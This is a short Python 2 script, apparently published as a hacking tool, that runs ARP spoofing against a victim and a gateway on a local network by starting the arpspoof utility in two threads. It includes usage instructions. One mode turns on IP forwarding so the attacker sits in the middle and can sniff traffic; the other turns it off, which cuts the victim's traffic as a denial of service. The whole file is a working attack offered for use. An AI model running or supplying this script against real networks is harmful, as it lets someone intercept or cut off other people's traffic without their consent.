#!/usr/bin/env python
# -*- coding: utf-8 -*-
import os, sys
import threading

"""
    File name: hacking-arp-spoofing-DOS.Sniffing.py
    Author: Jäger Cox // jagercox@gmail.com
    Date created: 04/08/2016
    License: MIT
    Python Version: 2.7
    Revision: PEP8
"""

__author__ = "Jäger Cox // jagercox@gmail.com"
__created__ = "08/08/2016"
__license__ = "MIT"
__version__ = "0.1"
__python_version__ = "2.7"
__email__ = "jagercox@gmail.com"

# sudo python arp-spoof.py 0 <interface> <gateway> <victim>

def on_promiscuo():
    pro = "echo 1 > /proc/sys/net/ipv4/ip_forward"
    output = os.popen(pro).read()
    print output

def off_promiscuo():
    pro = "echo 0 > /proc/sys/net/ipv4/ip_forward"
    output = os.popen(pro).read()
    print output

def start_direction(device_, ip_gateway_, ip_victim_):
    direction_one = "arpspoof -i " + device_ + " -t " + ip_gateway_ + " " + ip_victim_
    output = os.popen(direction_one).read()
    print output

def attack(device_,ip_gateway_,ip_victim_):
    t1 = threading.Thread(target=start_direction, args=(device_,ip_victim_,ip_gateway_,))
    t2 = threading.Thread(target=start_direction, args=(device_,ip_gateway_,ip_victim_,))
    t1.start()
    t2.start()

if __name__ == '__main__':
    type_ = sys.argv

    if int(type_[1]) == 1:
        on_promiscuo()
        attack(type_[2],type_[3],type_[4])
    elif int(type_[1]) == 0:
        off_promiscuo()
        attack(type_[2],type_[3],type_[4])

    try:
        while True:
            pass
    except KeyboardInterrupt:
        pass

    off_promiscuo()

    print "Stopping the attack..."
